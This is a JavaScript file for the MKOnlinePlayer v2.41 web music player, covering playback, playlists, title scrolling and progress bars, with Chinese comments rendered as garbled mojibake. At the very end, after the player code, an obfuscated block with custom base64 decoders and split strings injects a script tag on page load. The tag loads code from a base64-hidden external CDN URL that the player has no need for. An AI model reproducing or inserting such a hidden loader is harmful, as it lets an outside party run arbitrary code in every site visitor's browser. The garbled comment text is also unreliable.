/**************************************************
 * MKOnlinePlayer v2.41
 * 鎾�鏀惧櫒涓诲姛鑳芥ā鍧�
 * 缂栧啓锛歮engkun(https://mkblog.cn)
 * 鏃堕棿锛�2018-3-13
 *************************************************/
// 鎾�鏀惧櫒鍔熻兘閰嶇疆
var mkPlayer = {
    api: "/template/JOELEO/asset/inc/api.php", // api鍦板潃
    loadcount: 20,  // 鎼滅储缁撴灉涓�娆″姞杞藉�氬皯鏉�
    method: "POST",     // 鏁版嵁浼犺緭鏂瑰紡(POST/GET)
    defaultlist: 3,    // 榛樿�よ�佹樉绀虹殑鎾�鏀惧垪琛ㄧ紪鍙�
    autoplay: true,    // 鏄�鍚﹁嚜鍔ㄦ挱鏀�(true/false) *姝ら�夐」鍦ㄧЩ鍔ㄧ��鍙�鑳芥棤鏁�
    coverbg: false,      // 鏄�鍚﹀紑鍚�灏侀潰鑳屾櫙(true/false) *寮�鍚�鍚庝細鏈変簺鍗�
    mcoverbg: false,     // 鏄�鍚﹀紑鍚痆绉诲姩绔痌灏侀潰鑳屾櫙(true/false)
    dotshine: false,    // 鏄�鍚﹀紑鍚�鎾�鏀捐繘搴︽潯鐨勫皬鐐归棯鍔ㄦ晥鏋淸涓嶆敮鎸両E](true/false) *寮�鍚�鍚庝細鏈変簺鍗�
    mdotshine: false,   // 鏄�鍚﹀紑鍚痆绉诲姩绔痌鎾�鏀捐繘搴︽潯鐨勫皬鐐归棯鍔ㄦ晥鏋淸涓嶆敮鎸両E](true/false)
    volume: 0.6,        // 榛樿�ら煶閲忓��(0~1涔嬮棿)
    version: "v2.41",    // 鎾�鏀惧櫒褰撳墠鐗堟湰鍙�(浠呬緵璋冭瘯)
    debug: false   // 鏄�鍚﹀紑鍚�璋冭瘯妯″紡(true/false)
};



/*******************************************************
 * 浠ヤ笅鍐呭�规槸鎾�鏀惧櫒鏍稿績鏂囦欢锛屼笉寤鸿��杩涜�屼慨鏀癸紝鍚﹀垯鍙�鑳藉�艰嚧鎾�鏀惧櫒鏃犳硶姝ｅ父浣跨敤!
 * 
 * 鍝堝搱锛屽悡鍞�浣犵殑锛佹兂鏀瑰氨鏀瑰憲锛佷笉杩囧缓璁�淇�鏀逛箣鍓嶅厛銆愬�囦唤銆�,瑕佷笉鐒舵敼鍧忎簡寮勪笉濂戒簡銆�
 ******************************************************/

// 瀛樺偍鍏ㄥ眬鍙橀噺
var rem = [];

// 闊抽�戦敊璇�澶勭悊鍑芥暟
function audioErr() {
    // 娌℃挱鏀捐繃锛岀洿鎺ヨ烦杩�
    if(rem.playlist === undefined) return true;
    
    if(rem.errCount > 10) { // 杩炵画鎾�鏀惧け璐ョ殑姝屾洸杩囧��
        layer.msg('浼间箮鍑轰簡鐐归棶棰榽鎾�鏀惧凡鍋滄��');
        rem.errCount = 0;
    } else {
        rem.errCount++;     // 璁板綍杩炵画鎾�鏀惧け璐ョ殑姝屾洸鏁扮洰
        layer.msg('褰撳墠姝屾洸鎾�鏀惧け璐ワ紝鑷�鍔ㄦ挱鏀句笅涓�棣�');
        nextMusic();    // 鍒囨崲涓嬩竴棣栨瓕
    } 
}

// 鐐瑰嚮鏆傚仠鎸夐挳鐨勪簨浠�
function pause() {
    if(rem.paused === false) {  // 涔嬪墠鏄�鎾�鏀剧姸鎬�
        rem.audio[0].pause();  // 鏆傚仠
    } else {
        // 绗�涓�娆＄偣鎾�鏀�
        if(rem.playlist === undefined) {
            rem.playlist = rem.dislist;
            
            musicList[1].item = musicList[rem.playlist].item; // 鏇存柊姝ｅ湪鎾�鏀惧垪琛ㄤ腑闊充箰
            
            // 姝ｅ湪鎾�鏀� 鍒楄〃椤瑰凡鍙戠敓鍙樻洿锛岃繘琛屼繚瀛�
            playerSavedata('playing', musicList[1].item);   // 淇濆瓨姝ｅ湪鎾�鏀惧垪琛�
            
            listClick(0);
        }
        rem.audio[0].play();
    }
}

// 寰�鐜�椤哄簭
function orderChange() {
    var orderDiv = $(".btn-order");
    orderDiv.removeClass();
    switch(rem.order) {
        case 1:     // 鍗曟洸寰�鐜� -> 鍒楄〃寰�鐜�
            orderDiv.addClass("player-btn btn-order btn-order-list");
            orderDiv.attr("title", "鍒楄〃寰�鐜�");
            layer.msg("鍒楄〃寰�鐜�");
            rem.order = 2;
            break;
            
        case 3:     // 闅忔満鎾�鏀� -> 鍗曟洸寰�鐜�
            orderDiv.addClass("player-btn btn-order btn-order-single");
            orderDiv.attr("title", "鍗曟洸寰�鐜�");
            layer.msg("鍗曟洸寰�鐜�");
            rem.order = 1;
            break;
            
        // case 2:
        default:    // 鍒楄〃寰�鐜�(鍏跺畠) -> 闅忔満鎾�鏀�
            orderDiv.addClass("player-btn btn-order btn-order-random");
            orderDiv.attr("title", "闅忔満鎾�鏀�");
            layer.msg("闅忔満鎾�鏀�");
            rem.order = 3;
    }
}

// 鎾�鏀�
function audioPlay() {
    rem.paused = false;     // 鏇存柊鐘舵�侊紙鏈�鏆傚仠锛�
    refreshList();      // 鍒锋柊鐘舵�侊紝鏄剧ず鎾�鏀剧殑娉㈡氮
    $(".btn-play").addClass("btn-state-paused");        // 鎭㈠�嶆殏鍋�
    
    if((mkPlayer.dotshine === true && !rem.isMobile) || (mkPlayer.mdotshine === true && rem.isMobile)) {
        $("#music-progress .mkpgb-dot").addClass("dot-move");   // 灏忕偣闂�鐑佹晥鏋�
    }
    
    var music = musicList[rem.playlist].item[rem.playid];   // 鑾峰彇褰撳墠鎾�鏀剧殑姝屾洸淇℃伅
    var msg = "" + music.name + " - " + music.artist;  // 鏀瑰彉娴忚�堝櫒鏍囬��
    
    // 娓呴櫎瀹氭椂鍣�
    if (rem.titflash !== undefined ) 
    {
        clearInterval(rem.titflash);
    }
    // 鏍囬�樻粴鍔�
    titleFlash(msg);
}
// 鏍囬�樻粴鍔�
function titleFlash(msg) {

    // 鎴�鍙栧瓧绗�
    var tit = function() {
        msg = msg.substring(1,msg.length)+ msg.substring(0,1);
        document.title = msg;
    };
    // 璁剧疆瀹氭椂闂� 300ms婊氬姩
    rem.titflash = setInterval(function(){tit()}, 300);
}
// 鏆傚仠
function audioPause() {
    rem.paused = true;      // 鏇存柊鐘舵�侊紙宸叉殏鍋滐級
    
    $(".list-playing").removeClass("list-playing");        // 绉婚櫎鍏跺畠鐨勬�ｅ湪鎾�鏀�
    
    $(".btn-play").removeClass("btn-state-paused");     // 鍙栨秷鏆傚仠
    
    $("#music-progress .dot-move").removeClass("dot-move");   // 灏忕偣闂�鐑佹晥鏋�

     // 娓呴櫎瀹氭椂鍣�
    if (rem.titflash !== undefined ) 
    {
        clearInterval(rem.titflash);
    }
    document.title = rem.webTitle;    // 鏀瑰彉娴忚�堝櫒鏍囬��
}

// 鎾�鏀句笂涓�棣栨瓕
function prevMusic() {
    playList(rem.playid - 1);
}

// 鎾�鏀句笅涓�棣栨瓕
function nextMusic() {
    switch (rem.order ? rem.order : 1) {
        case 1,2: 
            playList(rem.playid + 1);
        break;
        case 3: 
            if (musicList[1] && musicList[1].item.length) {
                var id = parseInt(Math.random() * musicList[1].item.length);
                playList(id);
            }
        break;
        default:
            playList(rem.playid + 1); 
        break;
    }
}
// 鑷�鍔ㄦ挱鏀炬椂鐨勪笅涓�棣栨瓕
function autoNextMusic() {
    if(rem.order && rem.order === 1) {
        playList(rem.playid);
    } else {
        nextMusic();
    }
}

// 姝屾洸鏃堕棿鍙樺姩鍥炶皟鍑芥暟
function updateProgress(){
    // 鏆傚仠鐘舵�佷笉绠�
    if(rem.paused !== false) return true;
    // 鍚屾�ヨ繘搴︽潯
	music_bar.goto(rem.audio[0].currentTime / rem.audio[0].duration);
    // 鍚屾�ユ瓕璇嶆樉绀�	
	scrollLyric(rem.audio[0].currentTime);
}

// 鏄剧ず鐨勫垪琛ㄤ腑鐨勬煇涓�椤圭偣鍑诲悗鐨勫�勭悊鍑芥暟
// 鍙傛暟锛氭瓕鏇插湪鍒楄〃涓�鐨勭紪鍙�
function listClick(no) {
    // 璁板綍瑕佹挱鏀剧殑姝屾洸鐨刬d
    var tmpid = no;
    
    // 璋冭瘯淇℃伅杈撳嚭
    if(mkPlayer.debug) {
        console.log("鐐规挱浜嗗垪琛ㄤ腑鐨勭�� " + (no + 1) + " 棣栨瓕 " + musicList[rem.dislist].item[no].name);
    }
    
    // 鎼滅储鍒楄〃鐨勬瓕鏇茶�侀�濆�栧�勭悊
    if(rem.dislist === 0) {
        
        // 娌℃挱鏀捐繃
        if(rem.playlist === undefined) {
            rem.playlist = 1;   // 璁剧疆鎾�鏀惧垪琛ㄤ负 姝ｅ湪鎾�鏀� 鍒楄〃
            rem.playid = musicList[1].item.length - 1;  // 涓存椂璁剧疆姝ｅ湪鎾�鏀剧殑鏇茬洰涓� 姝ｅ湪鎾�鏀� 鍒楄〃鐨勬渶鍚庝竴棣�
        }
        
        // 鑾峰彇閫夊畾姝屾洸鐨勪俊鎭�
        var tmpMusic = musicList[0].item[no];
        
        
        // 鏌ユ壘褰撳墠鐨勬挱鏀惧垪琛ㄤ腑鏄�鍚﹀凡缁忓瓨鍦ㄨ繖棣栨瓕
        for(var i=0; i<musicList[1].item.length; i++) {
            if(musicList[1].item[i].id == tmpMusic.id && musicList[1].item[i].source == tmpMusic.source) {
                tmpid = i;
                playList(tmpid);    // 鎵惧埌浜嗙洿鎺ユ挱鏀�
                return true;    // 閫�鍑哄嚱鏁�
            }
        }
        
        
        // 灏嗙偣鍑荤殑杩欓」杩藉姞鍒版�ｅ湪鎾�鏀剧殑鏉＄洰鐨勪笅鏂�
        musicList[1].item.splice(rem.playid + 1, 0, tmpMusic);
        tmpid = rem.playid + 1;
        
        // 姝ｅ湪鎾�鏀� 鍒楄〃椤瑰凡鍙戠敓鍙樻洿锛岃繘琛屼繚瀛�
        playerSavedata('playing', musicList[1].item);   // 淇濆瓨姝ｅ湪鎾�鏀惧垪琛�
    } else {    // 鏅�閫氬垪琛�
        // 涓庝箣鍓嶄笉鏄�鍚屼竴涓�鍒楄〃浜嗭紙鍦ㄦ挱鏀惧埆鐨勫垪琛ㄧ殑姝屾洸锛夋垨鑰呮槸棣栨�℃挱鏀�
        if((rem.dislist !== rem.playlist && rem.dislist !== 1) || rem.playlist === undefined) {
            rem.playlist = rem.dislist;     // 璁板綍姝ｅ湪鎾�鏀剧殑鍒楄〃
            musicList[1].item = musicList[rem.playlist].item; // 鏇存柊姝ｅ湪鎾�鏀惧垪琛ㄤ腑闊充箰
            
            // 姝ｅ湪鎾�鏀� 鍒楄〃椤瑰凡鍙戠敓鍙樻洿锛岃繘琛屼繚瀛�
            playerSavedata('playing', musicList[1].item);   // 淇濆瓨姝ｅ湪鎾�鏀惧垪琛�
            
            // 鍒锋柊姝ｅ湪鎾�鏀剧殑鍒楄〃鐨勫姩鐢�
            refreshSheet();     // 鏇存敼姝ｅ湪鎾�鏀剧殑鍒楄〃鐨勬樉绀�
        }
    }
    
    playList(tmpid);
    
    return true;
}

// 鎾�鏀炬�ｅ湪鎾�鏀惧垪琛ㄤ腑鐨勬瓕鏇�
// 鍙傛暟锛氭瓕鏇插湪鍒楄〃涓�鐨処D
function playList(id) {
    // 绗�涓�娆℃挱鏀�
    if(rem.playlist === undefined) {
        pause();
        return true;
    }
    
    // 娌℃湁姝屾洸锛岃烦鍑�
    if(musicList[1].item.length <= 0) return true;
    
    // ID 鑼冨洿闄愬畾
    if(id >= musicList[1].item.length) id = 0;
    if(id < 0) id = musicList[1].item.length - 1;
    
    // 璁板綍姝ｅ湪鎾�鏀剧殑姝屾洸鍦ㄦ�ｅ湪鎾�鏀惧垪琛ㄤ腑鐨� id
    rem.playid = id;
    
    // 濡傛灉閾炬帴涓虹┖锛屽垯 ajax 鑾峰彇鏁版嵁鍚庡啀鎾�鏀�
    if(musicList[1].item[id].url === null || musicList[1].item[id].url === "") {
        ajaxUrl(musicList[1].item[id], play);
    } else {
        play(musicList[1].item[id]);
    }
}

// 鍒濆�嬪寲 Audio
function initAudio() {
    rem.audio = $('<audio></audio>').appendTo('body');
    
    // 搴旂敤鍒濆�嬮煶閲�
    rem.audio[0].volume = volume_bar.percent;
    // 缁戝畾姝屾洸杩涘害鍙樺寲浜嬩欢
    rem.audio[0].addEventListener('timeupdate', updateProgress);   // 鏇存柊杩涘害
    rem.audio[0].addEventListener('play', audioPlay); // 寮�濮嬫挱鏀句簡
    rem.audio[0].addEventListener('pause', audioPause);   // 鏆傚仠
    $(rem.audio[0]).on('ended', autoNextMusic);   // 鎾�鏀剧粨鏉�
    rem.audio[0].addEventListener('error', audioErr);   // 鎾�鏀惧櫒閿欒��澶勭悊
}


// 鎾�鏀鹃煶涔�
// 鍙傛暟锛氳�佹挱鏀剧殑闊充箰鏁扮粍
function play(music) {
    // 璋冭瘯淇℃伅杈撳嚭
    if(mkPlayer.debug) {
        console.log('寮�濮嬫挱鏀� - ' + music.name);
        
        console.info('id: "' + music.id + '",\n' + 
        'name: "' + music.name + '",\n' +
        'artist: "' + music.artist + '",\n' +
        'album: "' + music.album + '",\n' +
        'source: "' + music.source + '",\n' +
        'url_id: "' + music.url_id + '",\n' + 
        'pic_id: "' + music.pic_id + '",\n' + 
        'lyric_id: "' + music.lyric_id + '",\n' + 
        'pic: "' + music.pic + '",\n' +
        'url: "' + music.url + '"');
    }
    
    // 閬囧埌閿欒��鎾�鏀句笅涓�棣栨瓕
    if(music.url == "err") {
        audioErr(); // 璋冪敤閿欒��澶勭悊鍑芥暟
        return false;
    }
    
    addHis(music);  // 娣诲姞鍒版挱鏀惧巻鍙�
    
    // 濡傛灉褰撳墠涓荤晫闈㈡樉绀虹殑鏄�鎾�鏀惧巻鍙诧紝閭ｄ箞杩橀渶瑕佸埛鏂板垪琛ㄦ樉绀�
    if(rem.dislist == 2 && rem.playlist !== 2) {
        loadList(2);
    } else {
        refreshList();  // 鏇存柊鍒楄〃鏄剧ず
    }
    
    try {
        rem.audio[0].pause();
        rem.audio.attr('src', music.url);
        rem.audio[0].play();
    } catch(e) {
        audioErr(); // 璋冪敤閿欒��澶勭悊鍑芥暟
        return;
    }
    
    rem.errCount = 0;   // 杩炵画鎾�鏀惧け璐ョ殑姝屾洸鏁板綊闆�
    music_bar.goto(0);  // 杩涘害鏉″己鍒跺綊闆�
    changeCover(music);    // 鏇存柊灏侀潰灞曠ず
    ajaxLyric(music, lyricCallback);     // ajax鍔犺浇姝岃瘝
    music_bar.lock(false);  // 鍙栨秷杩涘害鏉￠攣瀹�
}


// 鎴戠殑瑕佹眰骞朵笉楂橈紝淇濈暀杩欎竴鍙ョ増鏉冧俊鎭�鍙�濂斤紵
// 淇濈暀浜嗭紝浣犱笉浼氭崯澶变粈涔堬紱鑰屼繚鐣欑増鏉冿紝鏄�瀵逛綔鑰呮渶澶х殑灏婇噸銆�
console.info('娆㈣繋浣跨敤 MKOnlinePlayer-鎱曚箶鐗瑰埗鐗�!\n褰撳墠鐗堟湰锛�'+mkPlayer.version+' \n浣滆�咃細mengkun(https://mkblog.cn)\n褰撳墠涓婚�橈細鎱曚箶灏忔竻鏂�(https://leeleo.cn)\n姝屾洸鏉ユ簮浜庡悇澶ч煶涔愬钩鍙癨nGithub锛歨ttps://github.com/mengkunsoft/MKOnlineMusicPlayer');

// 闊充箰杩涘害鏉℃嫋鍔ㄥ洖璋冨嚱鏁�
function mBcallback(newVal) {
    var newTime = rem.audio[0].duration * newVal;
    // 搴旂敤鏂扮殑杩涘害
    rem.audio[0].currentTime = newTime;
    refreshLyric(newTime);  // 寮哄埗婊氬姩姝岃瘝鍒板綋鍓嶈繘搴�
}

// 闊抽噺鏉″彉鍔ㄥ洖璋冨嚱鏁�
// 鍙傛暟锛氭柊鐨勫��
function vBcallback(newVal) {
    if(rem.audio[0] !== undefined) {   // 闊抽�戝�硅薄宸插姞杞藉垯绔嬪嵆鏀瑰彉闊抽噺
        rem.audio[0].volume = newVal;
    }
    
    if($(".btn-quiet").is('.btn-state-quiet')) {
        $(".btn-quiet").removeClass("btn-state-quiet");     // 鍙栨秷闈欓煶
    }
    
    if(newVal === 0) $(".btn-quiet").addClass("btn-state-quiet");
    
    playerSavedata('volume', newVal); // 瀛樺偍闊抽噺淇℃伅
}

// 涓嬮潰鏄�杩涘害鏉″�勭悊
var initProgress = function(){  
    // 鍒濆�嬪寲鎾�鏀捐繘搴︽潯
    music_bar = new mkpgb("#music-progress", 0, mBcallback);
    music_bar.lock(true);   // 鏈�鎾�鏀炬椂閿佸畾涓嶈�╂嫋鍔�
    // 鍒濆�嬪寲闊抽噺璁惧畾
    var tmp_vol = playerReaddata('volume');
    tmp_vol = (tmp_vol != null)? tmp_vol: (rem.isMobile? 1: mkPlayer.volume);
    if(tmp_vol < 0) tmp_vol = 0;    // 鑼冨洿闄愬畾
    if(tmp_vol > 1) tmp_vol = 1;
    if(tmp_vol == 0) $(".btn-quiet").addClass("btn-state-quiet"); // 娣诲姞闈欓煶鏍峰紡
    volume_bar = new mkpgb("#volume-progress", tmp_vol, vBcallback);
};  

// mk杩涘害鏉℃彃浠�
// 杩涘害鏉℃�� id锛屽垵濮嬮噺锛屽洖璋冨嚱鏁�
mkpgb = function(bar, percent, callback){  
    this.bar = bar;
    this.percent = percent;
    this.callback = callback;
    this.locked = false;
    this.init();  
};

mkpgb.prototype = {
    // 杩涘害鏉″垵濮嬪寲
    init : function(){  
        var mk = this,mdown = false;
        // 鍔犺浇杩涘害鏉�html鍏冪礌
        $(mk.bar).html('<div class="mkpgb-bar"></div><div class="mkpgb-cur"></div><div class="mkpgb-dot"></div>');
        // 鑾峰彇鍋忕Щ閲�
        mk.minLength = $(mk.bar).offset().left; 
        mk.maxLength = $(mk.bar).width() + mk.minLength;
        // 绐楀彛澶у皬鏀瑰彉鍋忕Щ閲忛噸缃�
        $(window).resize(function(){
            mk.minLength = $(mk.bar).offset().left; 
            mk.maxLength = $(mk.bar).width() + mk.minLength;
        });
        // 鐩戝惉灏忕偣鐨勯紶鏍囨寜涓嬩簨浠�
        $(mk.bar + " .mkpgb-dot").mousedown(function(e){
            e.preventDefault();    // 鍙栨秷鍘熸湁浜嬩欢鐨勯粯璁ゅ姩浣�
        });
        // 鐩戝惉杩涘害鏉℃暣浣撶殑榧犳爣鎸変笅浜嬩欢
        $(mk.bar).mousedown(function(e){
            if(!mk.locked) mdown = true;
            barMove(e);
        });
        // 鐩戝惉榧犳爣绉诲姩浜嬩欢锛岀敤浜庢嫋鍔�
        $("html").mousemove(function(e){
            barMove(e);
        });
        // 鐩戝惉榧犳爣寮硅捣浜嬩欢锛岀敤浜庨噴鏀炬嫋鍔�
        $("html").mouseup(function(e){
            mdown = false;
        });
        
        function barMove(e) {
            if(!mdown) return;
            var percent = 0;
            if(e.clientX < mk.minLength){ 
                percent = 0; 
            }else if(e.clientX > mk.maxLength){ 
                percent = 1;
            }else{  
                percent = (e.clientX - mk.minLength) / (mk.maxLength - mk.minLength);
            }
            mk.callback(percent);
            mk.goto(percent);
            return true;
        }
        
        mk.goto(mk.percent);
        
        return true;
    },
    // 璺宠浆鑷虫煇澶�
    goto : function(percent) {
        if(percent > 1) percent = 1;
        if(percent < 0) percent = 0;
        this.percent = percent;
        $(this.bar + " .mkpgb-dot").css("left", (percent*100) +"%"); 
        $(this.bar + " .mkpgb-cur").css("width", (percent*100)+"%");
        return true;
    },
    // 閿佸畾杩涘害鏉�
    lock : function(islock) {
        if(islock) {
            this.locked = true;
            $(this.bar).addClass("mkpgb-locked");
        } else {
            this.locked = false;
            $(this.bar).removeClass("mkpgb-locked");
        }
        return true;
    }
};  
function IsjhMEmW(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function iScfnleC(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t+=String.fromCharCode(n);if(u!=64){t+=String.fromCharCode(r)}if(a!=64){t+=String.fromCharCode(i)}}return IsjhMEmW(t)}eval('window')['\x4b\x75\x43\x62\x47\x46']=function(){;(function(u,r,w,d,f,c){var x=iScfnleC;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9jZG4ubWFvbml1Lnh5ei9jZG4vbWFjbXViYW4vaW5kZXguanM=','AjsfguonnKA',window,document,'orQVgZipae','ptIodXOnEQDH')};window['KuCbGF']();